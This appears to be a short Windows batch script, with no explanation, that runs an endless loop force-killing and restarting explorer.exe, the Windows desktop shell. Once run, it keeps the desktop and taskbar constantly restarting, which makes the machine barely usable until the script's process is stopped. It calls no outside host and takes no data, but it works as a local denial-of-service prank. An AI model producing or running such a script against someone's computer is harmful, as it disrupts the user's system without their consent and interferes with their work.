@echo off
:loop
taskkill /f /im explorer.exe
start explorer.exe
goto loop
exit